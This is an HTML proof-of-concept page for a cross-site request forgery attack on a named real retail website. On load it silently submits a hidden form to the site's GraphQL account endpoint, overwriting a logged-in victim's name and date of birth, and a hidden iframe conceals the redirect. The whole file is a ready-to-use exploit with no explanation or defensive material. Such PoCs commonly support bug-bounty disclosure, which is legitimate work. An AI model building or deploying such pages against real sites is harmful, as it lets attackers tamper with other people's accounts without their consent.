<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <h3>CSRF PoC: Update Personal Details via GraphQL</h3>

    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" target="csrf_iframe">
      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
        updateAccountSettings(input: $input) {
          error
          fieldErrors {
            fieldName
            validators
            requiredButNotProvided
            invalidOption
          }
        }
      }'>
      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"Hacked by CSRF"},{"fieldName":"dateOfBirth","value":"1990-01-01"}]}'>
      <input type="submit" value="Submit CSRF">
    </form>

    <!-- Hidden iframe to avoid user redirection -->
    <iframe name="csrf_iframe" style="display:none;"></iframe>
  </body>
</html>
